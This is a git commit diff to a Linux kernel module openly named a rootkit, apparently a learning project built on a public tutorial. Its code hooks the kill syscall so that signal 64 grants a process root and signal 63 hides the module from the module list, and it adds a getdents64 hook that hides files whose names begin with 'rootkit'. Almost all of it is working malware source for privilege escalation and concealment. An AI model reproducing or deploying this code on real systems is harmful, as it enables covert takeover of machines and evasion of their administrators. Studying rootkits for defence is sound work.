9ba718ca3c6fe88540d0bc376c35c706cede71f5
vagrant <nguyenluongthang33@gmail.com>
2024-11-04 04:03:00 +0000

    implement hiding directories functionality

--- rootkit.c
+++ rootkit.c
@@ -4,13 +4,15 @@
 #include <linux/syscalls.h>
 #include <linux/kallsyms.h>
 #include <linux/version.h>
+#include <linux/list.h>
+#include <linux/dirent.h>
 
 #include "ftrace_helper.h"
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("TheXcellerator");
-MODULE_DESCRIPTION("Giving root privileges to a process");
-MODULE_VERSION("0.02");
+MODULE_AUTHOR("Luong Thang Nguyen");
+MODULE_DESCRIPTION("My Rootkit");
+MODULE_VERSION("0.1");
 
 /* After Kernel 4.17.0, the way that syscalls are handled changed
  * to use the pt_regs struct instead of the more familiar function
@@ -19,6 +21,10 @@ MODULE_VERSION("0.02");
 #if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
 #define PTREGS_SYSCALL_STUBS 1
 #endif
+
+#define PREFIX "rootkit"
+static bool hidden = 0;
+static struct list_head *prev_save;
 
 /* We now have to check for the PTREGS_SYSCALL_STUBS flag and
  * declare the orig_kill and hook_kill functions differently
@@ -34,22 +40,107 @@ static asmlinkage long (*orig_kill)(const struct pt_regs *);
 asmlinkage int hook_kill(const struct pt_regs *regs)
 {
     void set_root(void);
+	void hide_mod(void);
+	void show_mod(void);
 
-    // pid_t pid = regs->di;
-    int sig = regs->si;
+	int sig = regs->si;
 
     if ( sig == 64 )
     {
-        printk(KERN_INFO "rootkit: giving root...\n");
+        printk(KERN_INFO "rootkit@hook_kill: giving root...\n");
         set_root();
         return 0;
-    }
+    } else if (sig == 63) {
+		if (hidden == 0) {
+			printk(KERN_INFO "rootkit@hook_kill: hiding rootkit from module lists\n");
+			hide_mod();
+		} else {
+			printk(KERN_INFO "rootkit@hook_kill: unhiding rootkit from module lists\n");
+			show_mod();
+		}
+		hidden = hidden ^ 1;
+	}
 
     return orig_kill(regs);
 
 }
+
+static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
+
+asmlinkage int hook_getdents64(const struct pt_regs *regs)
+{
+	// take dirent from userspace out from rsi register
+	struct linux_dirent64 __user *user_dirent = (struct linux_dirent64 *)regs->si;
+	
+	// for skipping entries
+	struct linux_dirent64 *previous_entry;
+	// for keep track current entry
+	struct linux_dirent64 *current_entry;
+	// kernel version of dirent, this is what we will modify on and copy back to userspace
+	struct linux_dirent64 *new_dirent;
+	
+	// acts kinda like an index to determine next dirent
+	unsigned long offset = 0;
+	
+	// get the original total length by running the original getdents64 syscall
+	int retval = orig_getdents64(regs);
+
+	// allocate same amount of bytes into our new_dirent
+	new_dirent = kzalloc(retval, GFP_KERNEL);
+
+	if ( (retval <= 0) || (new_dirent == NULL) )
+        return retval;
+
+    long error;
+    error = copy_from_user(new_dirent, user_dirent, retval);
+    if(error)
+        goto done;
+
+    while (offset < retval)
+    {
+        current_entry = (void *)new_dirent + offset;
+		
+		// if file name matches PREFIX , hide it from listing
+        if ( memcmp(PREFIX, current_entry->d_name, strlen(PREFIX)) == 0)
+        {
+            /* Check for the special case when we need to hide the first entry */
+            if( current_entry == new_dirent )
+            {
+                /* Decrement ret and shift all the structs up in memory */
+                retval -= current_entry->d_reclen;
+                memmove(current_entry, (void *)current_entry + current_entry->d_reclen, retval);
+                continue;
+            }
+            /* Hide the secret entry by incrementing d_reclen of previous_entry by
+             * that of the entry we want to hide - effectively "swallowing" it
+             */
+            previous_entry->d_reclen += current_entry->d_reclen;
+        }
+        else
+        {
+            /* Set previous_entry to current_entry before looping where current_entry
+             * gets incremented to the next entry
+             */
+            previous_entry = current_entry;
+        }
+
+        offset += current_entry->d_reclen;
+    }
+
+    error = copy_to_user(user_dirent, new_dirent, retval);
+    if(error)
+        goto done;
+
+done:
+    kfree(new_dirent);
+    return retval;
+}
+
 #else
-/* This is the old way of declaring a syscall hook */
+/* 	This is the old way of declaring a syscall hook.
+	I will just define one for hook_kill, 
+	because the implementation for other functions are roughly the same.
+*/
 static asmlinkage long (*orig_kill)(pid_t pid, int sig);
 
 static asmlinkage int hook_kill(pid_t pid, int sig)
@@ -88,9 +179,19 @@ void set_root(void)
     commit_creds(root);
 }
 
+void hide_mod(void) {
+	prev_save = (&THIS_MODULE->list)->prev;
+	list_del(&THIS_MODULE->list);
+}
+
+void show_mod(void) {
+	list_add(&THIS_MODULE->list, prev_save);
+}
+
 /* Declare the struct that ftrace needs to hook the syscall */
 static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_kill", hook_kill, &orig_kill),
+    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
 };
 
 /* Module initialization function */
